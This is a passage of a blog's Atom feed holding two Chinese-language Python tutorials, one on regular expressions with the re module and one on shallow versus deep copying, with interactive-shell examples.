<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>soliym</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://soliym.top/"/>
  <updated>2020-05-15T12:08:59.958Z</updated>
  <id>http://soliym.top/</id>
  
  <author>
    <name>soliym</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python之正则表达式</title>
    <link href="http://soliym.top/2020/05/15/python%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://soliym.top/2020/05/15/python之正则表达式/</id>
    <published>2020-05-15T12:08:59.956Z</published>
    <updated>2020-05-15T12:08:59.958Z</updated>
    
    <content type="html"><![CDATA[<p>正则表达式：</p><p>正则表达式也叫做匹配模式(Pattern)，它由一组具有特定含义的字符串组成，通常用于匹配和替换文本</p><p>正则表达式（英语：Regular Expression、regex 或 regexp，缩写为 RE），也译为正规表示法、常规表示法，在计算机科学中，是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串。</p><p>正则表达式这个概念最初是由 Unix 中的工具软件（例如 sed 和 grep）普及开的。</p> <a id="more"></a><p>使用正则表达式 </p><p>能很大程度的简化开发的复杂度和开发的效率，所以在 Python 中正则表达式在字符串的查 </p><p>询匹配操作中占据很重要的地位 </p><h5 id="python中的re模块"><a href="#python中的re模块" class="headerlink" title="python中的re模块"></a>python中的re模块</h5><p>为了方便对正则表达式的使用，python提供了re模块</p><p>导入模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import re</span><br></pre></td></tr></table></figure><p>查看re模块的方法和属性</p><p>dir（re）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;A&apos;, &apos;ASCII&apos;, &apos;DEBUG&apos;, &apos;DOTALL&apos;, &apos;I&apos;, &apos;IGNORECASE&apos;, &apos;L&apos;, &apos;LOCALE&apos;, &apos;M&apos;, &apos;MULTILINE&apos;, &apos;Match&apos;, &apos;Pattern&apos;, &apos;RegexFlag&apos;, &apos;S&apos;, &apos;Scanner&apos;, &apos;T&apos;, &apos;TEMPLATE&apos;, &apos;U&apos;, &apos;UNICODE&apos;, &apos;VERBOSE&apos;, &apos;X&apos;, &apos;_MAXCACHE&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__cached__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__loader__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__spec__&apos;, &apos;__version__&apos;, &apos;_cache&apos;, &apos;_compile&apos;, &apos;_compile_repl&apos;, &apos;_expand&apos;, &apos;_locale&apos;, &apos;_pickle&apos;, &apos;_special_chars_map&apos;, &apos;_subx&apos;, &apos;compile&apos;, &apos;copyreg&apos;, &apos;enum&apos;, &apos;error&apos;, &apos;escape&apos;, &apos;findall&apos;, &apos;finditer&apos;, &apos;fullmatch&apos;, &apos;functools&apos;, &apos;match&apos;, &apos;purge&apos;, &apos;search&apos;, &apos;split&apos;, &apos;sre_compile&apos;, &apos;sre_parse&apos;, &apos;sub&apos;, &apos;subn&apos;, &apos;template&apos;]</span><br></pre></td></tr></table></figure><h5 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h5><p>正则对到小写敏感，注意大小写</p><table><thead><tr><th><code></code>   <code>元字符</code></th><th><code></code>   <code>匹配内容</code></th></tr></thead><tbody><tr><td><code>.</code></td><td><code>匹配除换行符以外的任意字符</code></td></tr><tr><td><code>\w</code></td><td><code>匹配字母或数字或下划线 -python3中匹配各国语言符号</code></td></tr><tr><td><code>\s</code></td><td><code>匹配任意的空白符</code></td></tr><tr><td><code>\d</code></td><td><code>匹配数字</code></td></tr><tr><td><code>\n</code></td><td><code>匹配一个换行符</code></td></tr><tr><td><code>\t</code></td><td><code>匹配一个制表符</code></td></tr><tr><td><code>\b</code></td><td><code>匹配一个单词的结尾</code></td></tr><tr><td><code>^</code></td><td><code>匹配字符串的开始</code></td></tr><tr><td><code>$</code></td><td><code>匹配字符串的结尾</code></td></tr><tr><td>`a</td><td>b`</td><td><code>匹配字符a或字符b</code></td></tr><tr><td><code>[...]</code></td><td><code>匹配字符组中的字符</code></td></tr></tbody></table><h5 id="反义符"><a href="#反义符" class="headerlink" title="反义符"></a>反义符</h5><table><thead><tr><th><code>\W</code></th><th><code>匹配非字母或数字或下划线</code></th></tr></thead><tbody><tr><td><code>\D</code></td><td><code>匹配非数字</code></td></tr><tr><td><code>\S</code></td><td><code>匹配非空白符</code></td></tr><tr><td><code>[^...]</code></td><td><code>匹配除了字符组中字符的所有字符</code></td></tr></tbody></table><h5 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h5><p>python的字符串中\是具有特殊含义的，要正常表示一个\，需要两个\来表示<br>在正则中，\是具有特殊含义的，要正常表示一个\,需要两个\来表示</p><h5 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h5><table><thead><tr><th>*</th><th>重复零次或更多次</th></tr></thead><tbody><tr><td>+</td><td>重复一次或更多次</td></tr><tr><td>?</td><td>重复零次或一次</td></tr><tr><td>{n}</td><td>重复n次</td></tr><tr><td>{n,}</td><td>重复n次或更多次</td></tr><tr><td>{n,m}</td><td>重复n到m次</td></tr></tbody></table><h5 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h5><p>会形成匹配后的二次筛选</p><table><thead><tr><th><code>()</code></th><th><code>匹配括号内的表达式，也表示一个组</code></th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>正则表达式是非常灵活的，可以搭配的组合非常的多，所以通过大量练习，才能掌握搭配的规律</p><h5 id="元字符案例"><a href="#元字符案例" class="headerlink" title="元字符案例"></a>元字符案例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">除换行符以外的任意字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;.&quot;,&quot;123-4567-8910&quot;) //findall方法是对所有的字符匹配，并且存储在列表中</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;-&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;]</span><br><span class="line">#除换行外所有的都会被匹配</span><br><span class="line">匹配大小写字母，数字，下划线</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\w&quot;,&quot;123-4567-8910-ZayD-12_Wd&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;1&apos;, &apos;2&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;]</span><br><span class="line">#“-”字符没有匹配，其他三种都匹配</span><br><span class="line">匹配非大小写字母，数字，下划线</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\W&quot;,&quot;123-4567-8910-ZayD-12_Wd&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;-&apos;]</span><br><span class="line">#匹配非上述三种字符，反义符，大写</span><br><span class="line">匹配空白字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\s&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;\t&apos;, &apos;\n&apos;, &apos; &apos;]</span><br><span class="line">#空白符都会被匹配</span><br><span class="line">匹配非空白字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\S&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;-&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;-&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;-&apos;, &apos;1&apos;, &apos;2&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;-&apos;, &apos;1&apos;]</span><br><span class="line">#可以去除空白符，注意大写</span><br><span class="line">匹配数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\d&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">#匹配所有的数字</span><br><span class="line">匹配非数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\D&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;-&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;, &apos;-&apos;, &apos;\t&apos;, &apos;\n&apos;, &apos;-&apos;, &apos; &apos;]</span><br><span class="line">#去除字符串中的数字，注意大写</span><br><span class="line">匹配字符串的开始</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^1&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;]</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^2&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[]</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^\d&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;]</span><br><span class="line">#“^”后面紧接要匹配的字符</span><br><span class="line">匹配字符串的结束</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;$&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;&apos;]</span><br><span class="line">匹配字母或数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;1&apos;, &apos;2&apos;, &apos;W&apos;, &apos;d&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">匹配除字母或数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[^1-9a-zA-Z]&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;_&apos;, &apos;-&apos;, &apos;\t&apos;, &apos;\n&apos;, &apos;-&apos;, &apos; &apos;]</span><br></pre></td></tr></table></figure><h5 id="量词案例"><a href="#量词案例" class="headerlink" title="量词案例"></a>量词案例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]*&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;&apos;, &apos;4567&apos;, &apos;&apos;, &apos;8910&apos;, &apos;&apos;, &apos;ZayD&apos;, &apos;&apos;, &apos;12&apos;, &apos;&apos;, &apos;Wd&apos;, &apos;&apos;, &apos;8&apos;, &apos;&apos;, &apos;9&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;1&apos;, &apos;&apos;]</span><br><span class="line">#“*”量词是匹配0次或者多次，结果不匹配就是匹配是0次，所以会显示空</span><br><span class="line">&gt;&gt;&gt; re.match(&quot;[0-9a-zA-Z]*&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">&lt;re.Match object; span=(0, 3), match=&apos;123&apos;&gt;</span><br><span class="line">#match是匹配字符串开头的字母，123是数字所以可以匹配，而“-”不是所以不匹配，所以结果是“123”，如果不加“*”，匹配结果是“1”，所以进行了多次匹配</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]+&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;4567&apos;, &apos;8910&apos;, &apos;ZayD&apos;, &apos;12&apos;, &apos;Wd&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">#“+”是匹配一次或多次，所以不匹配就是匹配0次，所以不会显示</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]?&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;&apos;, &apos;1&apos;, &apos;2&apos;, &apos;&apos;, &apos;W&apos;, &apos;d&apos;, &apos;&apos;, &apos;8&apos;, &apos;&apos;, &apos;9&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;1&apos;, &apos;&apos;]</span><br><span class="line">#“？”是匹配0次或者一次，所以会逐位匹配</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;12&apos;, &apos;45&apos;, &apos;67&apos;, &apos;89&apos;, &apos;10&apos;, &apos;Za&apos;, &apos;yD&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#两次匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2,&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;4567&apos;, &apos;8910&apos;, &apos;ZayD&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#两次以上匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2,3&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;456&apos;, &apos;891&apos;, &apos;Zay&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#2次或三次匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.match(r&quot;&lt;([a-zA-Z]*)&gt;.*&lt;/\1&gt;&quot;,&quot;&lt;a&gt;www.baidu.com&lt;/a&gt;&quot;)</span><br><span class="line">&lt;re.Match object; span=(0, 20), match=&apos;&lt;a&gt;www.baidu.com&lt;/a&gt;&apos;&gt;</span><br><span class="line">#匹配html标签&lt;([a-zA-Z]*)&gt;.*&lt;/\1&gt;，后面的\1表示前面（）内的内容</span><br><span class="line">&gt;&gt;&gt; a = re.sub(r&quot;&lt;/?([a-zA-Z]*)&gt;&quot;,&apos;&apos;,&quot;&lt;a&gt;www.baidu.com&lt;/a&gt;&quot;)</span><br><span class="line">&gt;&gt;&gt; print(a)</span><br><span class="line">#匹配标签内的内容，？表示匹配0次或一次，前面标签没有，所以/没有匹配，后面的标签有/所以被匹配，如果换成“+”就不可以，因为至少匹配一次，同样，“*”是可以的，因为可以匹配0次</span><br></pre></td></tr></table></figure><h6 id="re模块的方法"><a href="#re模块的方法" class="headerlink" title="re模块的方法"></a>re模块的方法</h6><p>前面学习了正则表达式的写法，python为方便使用正则，提供了一下配合正则使用的方法</p><h6 id="1、search"><a href="#1、search" class="headerlink" title="1、search"></a>1、search</h6><p>执行正则表达式搜索并且在搜索结束后返回所匹配到的串，只返回第一次匹配到的结果 </p><p>求出帖子阅览的次数： </p><p>>&gt;&gt; import re </p><p>>&gt;&gt; res = re.search(r”\d+”,”当前浏览量是 8808 次”) </p><p>>&gt;&gt; res.group() </p><p>‘8808’ </p><h6 id="2、findall"><a href="#2、findall" class="headerlink" title="2、findall"></a>2、findall</h6><p>匹配所有的对象，返回一个列表 </p><p>>&gt;&gt; re.findall(r”\d+”,”1 当前浏览量是 8808 次，回帖人数是 200 人”) </p><p>[‘1’, ‘8808’, ‘200’] </p><h6 id="3、sub"><a href="#3、sub" class="headerlink" title="3、sub"></a>3、sub</h6><p>实现查找替换 </p><p>>&gt;&gt; re.sub(r”\d+”,”1024”,”当前浏览量是 8808 次”) </p><p>‘当前浏览量是 1024 次’ </p><h6 id="4、split"><a href="#4、split" class="headerlink" title="4、split"></a>4、split</h6><p>分割字符串，结果返回列表 </p><p>a = re.split(‘.‘,’<a href="http://www.baidu.com&#39;" target="_blank" rel="noopener">www.baidu.com&#39;</a>)</p><p>[‘www’, ‘baidu’, ‘com’]</p><h6 id="5、finditer"><a href="#5、finditer" class="headerlink" title="5、finditer"></a>5、finditer</h6><p>返回一个迭代器 iterator，这个 iterator yield match objects.返回顺序、内容和 re.findall() </p><p>相同</p><p>>&gt;&gt; inter = re.finditer(r”[a-z]”,”<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a>)</p><p>>&gt;&gt; next(inter)</p><p>&lt;re.Match object; span=(0, 1), match=’w’&gt;</p><h6 id="5、compile"><a href="#5、compile" class="headerlink" title="5、compile"></a>5、compile</h6><p>compile 用来编译正则表达式模式字符串，并生成 Regular Expression Objects。</p><p>这个方法用来修改re模块的匹配方法</p><p>compile(pattern, flags=0) </p><p>flags 有很多可选值： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.I(IGNORECASE)忽略大小写，括号内是完整的写法 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.M(MULTILINE)多行模式，改变^和$的行为 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.S(DOTALL)点可以匹配任意字符，包括换行符 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.L(LOCALE)做本地化识别的匹配，不推荐使用 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.U(UNICODE) 使用\w \W \s \S \d \D 使用取决于 unicode 定义的字符属性。在 python3 中默 </span><br><span class="line"></span><br><span class="line">认使用该 flag </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.X(VERBOSE)冗长模式，该模式下 pattern 字符串可以是多行的，忽略空白字符，并可以添加 </span><br><span class="line"></span><br><span class="line">注释</span><br></pre></td></tr></table></figure><h5 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h5><p>在 Python 中正则默认是贪婪模式</p><hr><p> 贪婪模式：尽可能匹配多个字符<br>非贪婪模式：尽可能匹配少的字符</p><hr><p>在*、？、+、{m,n}后面加上？，可以将贪婪模式变成非贪婪模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;\d*&quot;,&quot;123IOHH&quot;)</span><br><span class="line"></span><br><span class="line">&lt;re.Match object; span=(0, 3), match=&apos;123&apos;&gt;</span><br><span class="line"></span><br><span class="line">\&gt;&gt;&gt; re.match(&quot;\d*?&quot;,&quot;123IOHH&quot;)</span><br><span class="line"></span><br><span class="line">&lt;re.Match object; span=(0, 0), match=&apos;&apos;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;正则表达式：&lt;/p&gt;
&lt;p&gt;正则表达式也叫做匹配模式(Pattern)，它由一组具有特定含义的字符串组成，通常用于匹配和替换文本&lt;/p&gt;
&lt;p&gt;正则表达式（英语：Regular Expression、regex 或 regexp，缩写为 RE），也译为正规表示法、常规表示法，在计算机科学中，是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串。&lt;/p&gt;
&lt;p&gt;正则表达式这个概念最初是由 Unix 中的工具软件（例如 sed 和 grep）普及开的。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://soliym.top/categories/python/"/>
    
    
      <category term="高级编程" scheme="http://soliym.top/tags/%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python之深浅拷贝</title>
    <link href="http://soliym.top/2020/05/13/python%E4%B9%8B%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/"/>
    <id>http://soliym.top/2020/05/13/python之深浅拷贝/</id>
    <published>2020-05-13T03:25:17.774Z</published>
    <updated>2020-05-13T03:25:17.775Z</updated>
    
    <content type="html"><![CDATA[<p>深浅拷贝</p><a id="more"></a><h5 id="赋值（基本数据类型）"><a href="#赋值（基本数据类型）" class="headerlink" title="赋值（基本数据类型）"></a>赋值（基本数据类型）</h5><p>Python中，所谓的赋值实际上就是对象引用的传递</p><p>当创建一个对象的时候，再赋值给另外一个变量的时候，是把这个变量在地址空间的id地址值传递给另一个变量，简单的说就是拷贝了这个对象的引用。</p><p>主要的操作，栈内存的复制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=1</span><br><span class="line">&gt;&gt;&gt; b=a</span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">140734331088640</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">140734331088640</span><br></pre></td></tr></table></figure><h5 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h5><p>浅拷贝是对一个对象父级（外层）的拷贝，并不会拷贝子级（内部）。使用浅拷贝的时候，分为两种情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[1,2]</span><br><span class="line">&gt;&gt;&gt; b=[3,4]</span><br><span class="line">&gt;&gt;&gt; c=[a,b]</span><br><span class="line">&gt;&gt;&gt; d=copy.copy(c)</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">2518098905416</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">2518098905736</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">2518098717064</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">2518098717064</span><br></pre></td></tr></table></figure><p>对于c和d来说是一个列表，是可变的，所以浅拷贝时，id地址会发生变化，但是c和d内部的元素也是列表对象，但是内部的对象不会拷贝，所以id地址不变</p><h6 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h6><p>如果最外层的数据类型是可变的，比如说列表，字典等，浅拷贝会开启新的地址空间去存放。</p><p>赋值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list = [1,2,3,4]</span><br><span class="line">&gt;&gt;&gt; id(list)</span><br><span class="line">2518066946632</span><br><span class="line">&gt;&gt;&gt; lt = list</span><br><span class="line">&gt;&gt;&gt; id(lt)</span><br><span class="line">2518066946632</span><br></pre></td></tr></table></figure><p>浅拷贝：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import copy</span><br><span class="line">&gt;&gt;&gt; ls = copy.copy(list)</span><br><span class="line">&gt;&gt;&gt; id(ls)</span><br><span class="line">2518098812040</span><br></pre></td></tr></table></figure><p>地址发生变化</p><h6 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h6><p>如果最外层的数据类型是不可变的，比如元组，字符串等，浅拷贝对象的时候，还是引用对象的地址空间。</p><p>浅拷贝：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;123456&apos;</span><br><span class="line">&gt;&gt;&gt; str1 = copy.copy(str)</span><br><span class="line">&gt;&gt;&gt; id(str)</span><br><span class="line">2518098724264</span><br><span class="line">&gt;&gt;&gt; id(str1)</span><br><span class="line">2518098724264</span><br></pre></td></tr></table></figure><p>地址没有发生变化</p><h5 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h5><p>深拷贝对一个对象是所有层次的拷贝（递归），内部和外部都会被拷贝过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d=copy.deepcopy(c)</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1408115280264</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">1408115279944</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">1408115186504</span><br><span class="line">&gt;&gt;&gt; id(c[1])</span><br><span class="line">1408115091144</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">1408115279880</span><br></pre></td></tr></table></figure><p>深拷贝的内部对象和外部对象地址都是不一样的</p><p>深拷贝</p><p>也分两种情况：</p><h6 id="第一种-1"><a href="#第一种-1" class="headerlink" title="第一种"></a>第一种</h6><p>最外层数据类型可变。这个时候，内部和外部的都会拷贝过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 